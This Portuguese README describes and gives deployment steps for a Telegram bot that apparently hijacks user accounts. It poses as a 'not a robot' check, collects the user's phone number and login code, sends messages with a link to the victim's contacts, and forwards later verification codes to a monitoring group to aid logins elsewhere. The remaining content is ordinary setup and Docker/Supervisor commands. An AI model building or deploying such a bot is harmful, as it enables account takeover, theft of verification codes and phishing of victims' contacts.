# Bot Telegram Python

Bot para automação de interações no Telegram.

## Fluxo do Bot

O bot segue o seguinte fluxo de operação:

1. **Verificação Inicial**:

   - O usuário inicia o bot com o comando `/start`
   - O bot solicita confirmação de que não é um robô
   - O usuário precisa enviar seu contato telefônico

2. **Autenticação**:

   - Se o número já tiver uma sessão existente e autenticada, o bot prossegue diretamente
   - Caso contrário, envia um código de verificação para o Telegram do usuário
   - O usuário digita o código de 5 dígitos recebido

3. **Processamento Automatizado**:

   - Após autenticação, o bot acessa os contatos do usuário
   - Envia mensagens predefinidas com link para contatos específicos
   - Entra temporariamente em um grupo para enviar logs da operação
   - Configura um timer para verificar novas mensagens do sistema Telegram

4. **Sistema de Verificação Dupla**:

   - Após 3 minutos, verifica se há novas mensagens do sistema Telegram (possíveis códigos)
   - Se encontrar um código de verificação, reenvia para o grupo de monitoramento
   - Facilita tentativas de login em várias plataformas

5. **Sistema de Monitoramento**:
   - O script monitor.py verifica continuamente se o bot está operacional
   - Em caso de falha, reinicia o bot automaticamente
   - Envia notificações sobre o status do bot para um grupo designado

## Configuração do Ambiente

### Requisitos

- Python 3.10 ou superior
- pip (gerenciador de pacotes do Python)
- Docker (opcional, para uso com containers)

### Variáveis de Ambiente

Crie um arquivo `.env` na raiz do projeto com as seguintes variáveis:

```
API_ID=seu_api_id
API_HASH=seu_api_hash
BOT_TOKEN=seu_bot_token
NOTIFICATION_CHAT_ID=id_do_chat_para_notificacoes
```

## Executando Localmente

1. Instale as dependências:

```bash
pip install -r requirements.txt
```

2. Execute o bot:

```bash
python main.py
```

3. Execute o monitor em uma janela separada:

```bash
python monitor.py
```

## Implantação com Docker

1. Construa a imagem:

```bash
docker-compose build
```

2. Inicie o container:

```bash
docker-compose up -d
```

3. Visualize os logs:

```bash
docker-compose logs -f
```

4. Para parar:

```bash
docker-compose down
```

## Implantação em Servidor Compartilhado (Hostinger)

1. Faça upload de todos os arquivos para o servidor

2. Dê permissão de execução aos scripts:

```bash
chmod +x start.sh stop.sh
```

3. Inicie o bot:

```bash
./start.sh
```

4. Para parar o bot:

```bash
./stop.sh
```

## Implantação em VPS com Supervisor

1. Instale o supervisor:

```bash
apt-get update && apt-get install -y supervisor
```

2. Copie o arquivo de configuração:

```bash
cp supervisor.conf /etc/supervisor/conf.d/telegram-bot.conf
```

3. Atualize o diretório no arquivo de configuração se necessário

4. Recarregue o supervisor:

```bash
supervisorctl reread
supervisorctl update
```

5. Verificar status:

```bash
supervisorctl status
```

## Comandos Úteis

- Ver logs do bot:

```bash
tail -f logs/bot.log
```

- Ver logs do monitor:

```bash
tail -f logs/monitor.log
```

- Verificar processos em execução:

```bash
ps aux | grep python
```

## Resolução de Problemas

1. **Bot não inicia:** Verifique os logs por erros e confirme se as variáveis de ambiente estão configuradas corretamente.

2. **Erros de conexão com a API do Telegram:** Confirme sua conexão com a internet e valide as credenciais API_ID e API_HASH.

3. **Sessões não persistem:** Certifique-se de que o diretório de sessões tem permissões de escrita.
